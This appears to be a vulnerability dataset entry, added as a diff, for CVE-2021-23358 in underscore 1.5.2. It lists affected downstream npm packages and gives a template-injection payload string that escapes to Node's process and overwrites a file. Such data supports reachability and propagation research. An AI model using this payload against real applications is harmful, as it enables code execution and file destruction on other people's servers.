@@ -1,0 +1,23 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.5.2",
+  "keymethod": "variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "phpjs@1.3.2",
+    "js2coffee@0.2.7",
+    "messageformat@0.2.2",
+    "gulp-build@0.5.3",
+    "js.utils@0.2.11",
+    "cucumber@0.3.3",
+    "auth0-lock@9.2.3",
+    "stormpath@0.20.1",
+    "easyrtc@1.1.0",
+    "shellreactions-exec@0.0.4",
+    "node-ansible@0.5.5",
+    "salient@0.2.1",
+    "loopback@1.3.4",
+    "sdp@0.3.1"
+  ]
+}
